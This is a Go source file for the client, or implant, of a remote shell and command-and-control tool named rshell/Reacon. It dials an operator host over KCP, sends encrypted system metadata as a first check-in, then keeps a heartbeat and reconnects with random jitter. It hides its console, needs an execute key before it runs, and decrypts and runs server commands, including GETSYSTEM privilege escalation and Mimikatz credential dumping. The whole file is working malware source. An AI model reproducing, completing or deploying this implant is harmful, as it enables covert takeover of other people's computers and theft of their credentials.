package main

import (
	"Reacon/pkg/communication"
	"rshell-client/shared/config"
	"rshell-client/shared/encrypt"
	"rshell-client/shared/link"
	"rshell-client/shared/services"
	"rshell-client/shared/utils"
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"
)

type KCPClient struct {
	Client            *kcp.UDPSession
	Buffer            []byte
	BufferSize        int64
	MS                bytes.Buffer
	IsConnected       bool
	SendSync          sync.Mutex
	ActivatePong      bool
	RemarkMessage     string
	RemarkClientColor string
	keepAlive         *time.Ticker
}

func init() {
	link.ReportError = communication.ErrorProcess
	link.ReportData = communication.DataProcess
}

func (s *KCPClient) InitializeClient(host string) {
	conn, err := kcp.DialWithOptions(host, nil, 10, 3)
	if err != nil {
		s.IsConnected = false
		return
	}
	communication.KCPClient = conn

	s.Client = conn
	if s.Client != nil {
		s.IsConnected = true
		s.Buffer = make([]byte, 4)
		s.MS.Reset()

		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
		}
		firstBloodInt := 1
		firstBloodBytes := utils.WriteInt(firstBloodInt)
		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)
		communication.Send(firstBloodMsg, s.Client)

		if s.keepAlive != nil {
			s.keepAlive.Stop()
		}
		s.keepAlive = time.NewTicker(8 * time.Second)

		go func() {
			for range s.keepAlive.C {
				s.KeepAlivePacket(s.Client)
			}
		}()

		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *KCPClient) ReadServerData() {
	if s.Client == nil || !s.IsConnected {
		s.IsConnected = false
		return
	}

		s.Client.SetReadDeadline(time.Now().Add(35 * time.Second))
	n, err := s.Client.Read(s.Buffer)
	if err != nil {
		s.IsConnected = false
		return
	}

	if n == 4 {
		s.MS.Write(s.Buffer)
		s.BufferSize = int64(binary.BigEndian.Uint32(s.MS.Bytes()))
		s.MS.Reset()

		if s.BufferSize > 0 {
			s.Buffer = make([]byte, s.BufferSize)
			for int64(s.MS.Len()) != s.BufferSize {
				s.Client.SetReadDeadline(time.Now().Add(35 * time.Second))
				rc, err := s.Client.Read(s.Buffer)
				if err != nil {
					s.IsConnected = false
					return
				}
				s.MS.Write(s.Buffer[:rc])
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
			if int64(s.MS.Len()) == s.BufferSize {
				data := s.MS.Bytes()
				if data != nil {
					totalLen := len(data)
					if totalLen > 0 {
						rawData, err := encrypt.DecodeBase64(data)
						if err != nil {
							fmt.Println(err)
						}
						data, err = encrypt.Decrypt(rawData)
						if err != nil {
							fmt.Println(err)
						}
						decrypted, err := encrypt.Decrypt(data)
						if err != nil {
							communication.ErrorProcess(err)
							fmt.Println(err)
						}
						if len(decrypted) < 4 {
							return
						}
						cmdType := binary.BigEndian.Uint32(decrypted[:4])
						cmdBuf := decrypted[4:]

						// Long-running commands run async so keepalive doesn't time out
						if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
							go func(ct uint32, cb []byte) {
								result, callbackType, err := services.DispatchCommand(ct, cb)
								if err != nil {
									communication.ErrorProcess(err)
								} else if callbackType >= 0 {
									communication.DataProcess(callbackType, result)
								}
					}(cmdType, cmdBuf)
						return
						}

						if cmdBuf != nil {
							result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
							if cmdType == services.EXIT && err == nil {
								os.Exit(1)
							}
							if err != nil {
								communication.ErrorProcess(err)
							} else if callbackType >= 0 {
								communication.DataProcess(callbackType, result)
							}
							if err != nil {
								communication.ErrorProcess(err)
							} else {
								if callbackType >= 0 {
									communication.DataProcess(callbackType, result)
								}
							}
						}
					}
				}
				s.Buffer = make([]byte, 4)
				s.MS.Reset()
			} else {
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
		}
		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *KCPClient) KeepAlivePacket(conn *kcp.UDPSession) {
	heartBeatInt := 3
	heartBeatBytes := utils.WriteInt(heartBeatInt)
	heartBeatMsg := utils.BytesCombine(heartBeatBytes, utils.MetaInfo)

	communication.Send(heartBeatMsg, conn)
	s.ActivatePong = true
}

func (s *KCPClient) Reconnect(host string) {
	s.CloseConnection()
	s.InitializeClient(host)
}

func (s *KCPClient) CloseConnection() {
	if s.Client != nil {
		s.Client.Close()
	}
	s.MS.Reset()
	if s.keepAlive != nil {
		s.keepAlive.Stop()
	}
}

func Run_main(host string) {
	socket := KCPClient{}
	socket.InitializeClient(host)

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	for {
		if !socket.IsConnected {
			socket.Reconnect(host)
		}
		time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
	}
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}

	host := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	host = strings.ReplaceAll(host, " ", "")
	encrypt.GenerateKeyPair()
	Run_main(host)
}
